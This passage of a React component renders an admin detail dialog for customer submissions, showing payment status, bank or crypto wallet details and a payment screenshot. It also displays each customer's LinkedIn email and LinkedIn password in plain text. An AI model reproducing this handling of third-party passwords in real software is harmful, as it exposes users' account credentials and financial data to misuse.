                        <Briefcase className="h-4 w-4 text-gray-500" />
                        <span className="text-gray-900">
                          Total Price: $
                          {selectedSubmission.totalPrice ||
                            selectedSubmission.cost}
                        </span>
                      </div>
                    )}
                    {selectedSubmission.paymentMethod && (
                      <div className="flex items-center gap-2">
                        <Clipboard className="h-4 w-4 text-gray-500" />
                        <span className="text-gray-900">
                          Payment Method: {selectedSubmission.paymentMethod}
                        </span>
                      </div>
                    )}
                    {selectedSubmission.paymentStatus && (
                      <div className="flex items-center gap-2">
                        <Badge variant="outline" className="border-gray-300">
                          Payment Status: {selectedSubmission.paymentStatus}
                        </Badge>
                      </div>
                    )}
                    {selectedSubmission.status && (
                      <div className="flex items-center gap-2">
                        <Badge
                          variant={
                            selectedSubmission.status === "completed"
                              ? "default"
                              : selectedSubmission.status === "processing"
                              ? "secondary"
                              : "outline"
                          }
                          className="border-gray-300"
                        >
                          Order Status: {selectedSubmission.status}
                        </Badge>
                      </div>
                    )}
                    {selectedSubmission.paymentScreenshot && (
                      <div className="space-y-2">
                        <div className="flex items-center gap-2">
                          <Lock className="h-4 w-4 text-green-600" />
                          <span className="font-medium text-green-600">
                            Payment Screenshot:
                          </span>
                        </div>
                        <div className="border rounded-lg p-2 bg-gray-50 border-gray-300">
                          <img
                            src={selectedSubmission.paymentScreenshot}
                            alt="Payment Screenshot"
                            className="max-w-full h-auto max-h-48 rounded cursor-pointer hover:opacity-80 transition-opacity"
                            onClick={() =>
                              window.open(
                                selectedSubmission.paymentScreenshot,
                                "_blank"
                              )
                            }
                          />
                          <div className="mt-2 text-xs text-gray-600">
                            Click to view full size
                          </div>
                        </div>
                      </div>
                    )}
                    {selectedSubmission.linkedinEmail && (
                      <div className="flex items-center gap-2">
                        <Building className="h-4 w-4 text-gray-500" />
                        <span className="text-gray-900">
                          LinkedIn Email:{" "}
                          {selectedSubmission.linkedinEmail || "Not specified"}
                        </span>
                      </div>
                    )}
                    {selectedSubmission.linkedinPassword && (
                      <div className="flex items-center gap-2">
                        <Building className="h-4 w-4 text-gray-500" />
                        <span className="text-gray-900">
                          LinkedIn Password:{" "}
                          {selectedSubmission.linkedinPassword ||
                            "Not specified"}
                        </span>
                      </div>
                    )}
                    {selectedSubmission.paymentInfo && (
                      <div className="flex flex-col gap-2">
                        <div className="flex items-center gap-2">
                          <Briefcase className="h-4 w-4 text-gray-500" />
                          <p className="text-gray-900">Payment Info</p>
                        </div>
                        <ul className="ml-6 list-disc text-sm text-gray-700">
                          <li>
                            Method:{" "}
                            {selectedSubmission.paymentInfo?.method || "None"}
                          </li>
                          {selectedSubmission.paymentInfo?.method ===
                            "bank" && (
                            <>
                              <li>
                                Account Number:{" "}
                                {
                                  selectedSubmission.paymentInfo.bank
                                    .accountNumber
                                }
                              </li>
                              <li>
                                IFSC: {selectedSubmission.paymentInfo.bank.ifsc}
                              </li>
                            </>
                          )}
                          {selectedSubmission.paymentInfo?.method ===
                            "crypto" && (
                            <>
                              <li>
                                Wallet ID:{" "}
                                {selectedSubmission.paymentInfo.crypto.walletId}
                              </li>
                              <li>
                                Network:{" "}
                                {selectedSubmission.paymentInfo.crypto.network}
                              </li>
                            </>
                          )}
                        </ul>
                      </div>
                    )}
                  </CardContent>
                </Card>
              </div>
            )}

            <DialogFooter className="flex justify-between items-center">
              <div className="flex items-center">
                {selectedSubmission?.read !== undefined && (
                  <Badge
                    variant={selectedSubmission.read ? "default" : "secondary"}
                    className={
                      selectedSubmission.read
                        ? "bg-green-100 text-green-800"
                        : "bg-yellow-100 text-yellow-800"
                    }
                  >
                    {selectedSubmission.read ? "Read" : "Unread"}
                  </Badge>
                )}
              </div>
              <div className="space-x-2">
                <Button
                  variant="outline"
                  onClick={() => setViewDetailOpen(false)}
                  className="bg-white border-gray-300"
                >
                  Close
                </Button>
              </div>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
}
